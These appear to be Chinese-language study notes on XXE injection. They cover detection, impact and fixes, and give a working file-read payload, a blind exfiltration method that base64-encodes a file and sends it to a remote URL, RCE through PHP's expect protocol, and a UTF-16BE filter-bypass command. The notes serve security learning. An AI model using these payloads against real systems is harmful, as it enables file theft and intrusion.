# XML&XXE

XML是一种用来传输和存储数据的格式类型

XXE：XML的漏洞注入全称

## XXE（XML External Entity Injection）
## XML外部实体注入漏洞

XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成危害

危害：

文件读取，RCE，内网攻击，DOS

检测：

白盒（函数及可控变量查找），黑盒（人工：数据格式类型判断，如`<user>test</user>`，Content-Type值判断，如`text/xml`或者`application/xml`，更改`Content-Type`值看返回结果；工具检测）

利用：

输出形式：有回显（协议玩法，http，file，其他协议；外部引用），无回显（外部引用-反向链接配合）
过滤绕过：协议玩法，外部引用，编码`UTF-16BE`

修复：

禁用外部实体引用
过滤关键字
WAF产品



### 漏洞利用示例：
```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
	<!ENTITY xxe SYSTEM "file:///d://test.txt">
]>
<x>&xxe;</x>
```

直接放到接收xml数据的api里执行

其他玩法：请求内网地址，可以探测内网，类似ssrf

RCE：安装了expect扩展的php环境，可以使用expect当作协议来执行系统命令

引入外部实体dtd

从远程加载xml



### 无回显：

这种情况下使用`php://filter/read=convert.base64-encode/resource=test.txt`

类似这种方式，读取文件然后base64编码

然后请求远程地址

如`http://127.0.0.1/x.php?data=%file;`

把数据发送出去，远端接收即可

可以用查看日志等方式查看到结果

关于xxe绕过

参考：<https://www.cnblogs.com/20175211lyz/p/11413335.html>



`UTF-16BE：`

`cat payload.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml`

### xxe靶场：`xxe-lab`

### xxe测试点寻找：`burpsuite抓包+发送到爬虫+HTTP history+Filter（过滤器）查找MIME type为xml的数据`

### base32：一种类似base64的编码

### XXE安全漏洞自动化注射脚本工具-`XXEinjector（Ruby）`
